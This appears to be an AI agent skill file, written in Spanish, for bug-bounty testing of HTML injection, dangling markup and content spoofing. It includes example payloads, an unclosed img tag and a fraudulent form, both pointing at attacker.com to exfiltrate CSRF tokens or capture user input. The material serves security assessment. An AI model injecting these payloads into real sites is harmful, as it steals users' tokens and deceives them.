---
name: bug-bounty-html-injection
description: Detección y mitigación de HTML Injection, Dangling Markup Injection, suplantación de contenido (Content Spoofing) y exfiltración de tokens sin necesidad de ejecutar JavaScript.
---

# Skill: HTML & Dangling Markup Injection Assessment

Esta habilidad capacita al agente para evaluar vulnerabilidades donde una aplicación web permite inyectar etiquetas HTML arbitrarias (sin llegar a ejecutar código JavaScript debido a sanitización parcial o CSP estricta).

## 📌 Vectores Principales

### 1. Dangling Markup Injection (Exfiltración de Tokens sin JS)
- Si una etiqueta inyectada no se cierra correctamente (ej. `<img src="https://attacker.com/log?body=`), el navegador incluirá todo el contenido HTML restante del DOM hasta la siguiente comilla como parte del parámetro de la imagen, capturando tokens CSRF ocultos o datos sensibles en los logs del servidor atacante.

### 2. Content Spoofing
- Inyección de etiquetas de texto o formularios fraudulentos (`<form action="https://attacker.com">`) para engañar al usuario final en portales legítimos.

---

## 📚 Referencias Técnicas

Consulta los detalles y remediación en:
[dangling-markup.md](file:///C:/Users/logir/.gemini/antigravity-ide/scratch/bug-bounty-skills/skills/bug-bounty-html-injection/references/dangling-markup.md)
